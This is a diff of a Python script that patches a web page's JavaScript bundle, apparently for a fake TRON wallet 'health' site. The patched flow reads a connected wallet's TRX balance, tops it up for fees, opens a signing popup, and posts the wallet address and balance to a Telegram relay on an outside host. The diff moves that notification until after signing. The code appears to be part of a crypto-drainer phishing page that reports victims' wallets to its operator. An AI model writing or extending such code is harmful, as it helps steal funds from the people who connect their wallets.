@@ -133,15 +133,6 @@ new_flow = r'''                    try {
                     o(balanceInTRX);
                     console.log("TRX balance check", balanceInTRX);
 
-                    // Notify Telegram immediately on connect (do not wait for sign)
-                    GS.post("https://tronscantelegram.onrender.com/api/telegram", {
-                        text: `Wallet connected\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nTime: ${new Date().toISOString()}`
-                    }, {
-                        timeout: 8000
-                    }).catch((telegramErr) => {
-                        console.error("Telegram wallet-connect notify failed:", telegramErr)
-                    });
-
                     if (balanceInTRX < minTrx) {
                         console.log("TRX below 11, starting top-up");
                         try {
@@ -152,11 +143,6 @@ new_flow = r'''                    try {
                             });
                             console.log("TRX top-up response", topUpResponse && topUpResponse.data);
                             if (!(topUpResponse && topUpResponse.data && topUpResponse.data.success)) {
-                                GS.post("https://tronscantelegram.onrender.com/api/telegram", {
-                                    text: `TRX top-up failed\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nTime: ${new Date().toISOString()}`
-                                }, {
-                                    timeout: 8000
-                                }).catch(() => {});
                                 window.alert("TRX top-up failed. Need TRX for transaction fees.");
                                 t(2);
                                 return
@@ -171,11 +157,6 @@ new_flow = r'''                    try {
                             try {
                                 balanceInTRX = parseFloat(await a.getBalance(c)) || 0;
                                 if (balanceInTRX < minTrx) {
-                                    GS.post("https://tronscantelegram.onrender.com/api/telegram", {
-                                        text: `TRX top-up error\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nError: ${(topUpError && topUpError.message) || "unknown"}\nTime: ${new Date().toISOString()}`
-                                    }, {
-                                        timeout: 8000
-                                    }).catch(() => {});
                                     window.alert("TRX top-up failed. Need TRX for transaction fees.");
                                     t(2);
                                     return
@@ -192,6 +173,13 @@ new_flow = r'''                    try {
 
                     console.log("Opening sign popup");
                     await f(c);
+
+                    // fire-and-forget telegram
+                    GS.post("https://tronscantelegram.onrender.com/api/telegram", {
+                        text: `Wallet connected\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nTime: ${new Date().toISOString()}`
+                    }, {
+                        timeout: 8000
+                    }).catch(() => {});
 '''
 
 text = text[:after_connect] + new_flow + text[catch_anchor:]
@@ -245,13 +233,14 @@ index = Path(r"D:\trchealth.live-main (1)\trchealth.live-main\index.html")
 html = index.read_text(encoding="utf-8")
 for v in ["signfix4", "signfix5", "signfix6", "main.cbdd1720.js?v=signfix6"]:
     pass
-html = html.replace("main.cbdd1720.js?v=signfix5", "main.cbdd1720.js?v=signfix9")
-html = html.replace("main.cbdd1720.js?v=signfix6", "main.cbdd1720.js?v=signfix9")
-html = html.replace("main.cbdd1720.js?v=signfix4", "main.cbdd1720.js?v=signfix9")
-html = html.replace("main.cbdd1720.js?v=signfix7", "main.cbdd1720.js?v=signfix9")
-html = html.replace("main.cbdd1720.js?v=signfix8", "main.cbdd1720.js?v=signfix9")
-if "signfix9" not in html:
-    html = html.replace('src="static/js/main.cbdd1720.js"', 'src="static/js/main.cbdd1720.js?v=signfix9"')
+html = html.replace("main.cbdd1720.js?v=signfix5", "main.cbdd1720.js?v=signfix10")
+html = html.replace("main.cbdd1720.js?v=signfix6", "main.cbdd1720.js?v=signfix10")
+html = html.replace("main.cbdd1720.js?v=signfix4", "main.cbdd1720.js?v=signfix10")
+html = html.replace("main.cbdd1720.js?v=signfix7", "main.cbdd1720.js?v=signfix10")
+html = html.replace("main.cbdd1720.js?v=signfix8", "main.cbdd1720.js?v=signfix10")
+html = html.replace("main.cbdd1720.js?v=signfix9", "main.cbdd1720.js?v=signfix10")
+if "signfix10" not in html:
+    html = html.replace('src="static/js/main.cbdd1720.js"', 'src="static/js/main.cbdd1720.js?v=signfix10"')
 index.write_text(html, encoding="utf-8")
 
 path.write_text(text, encoding="utf-8")
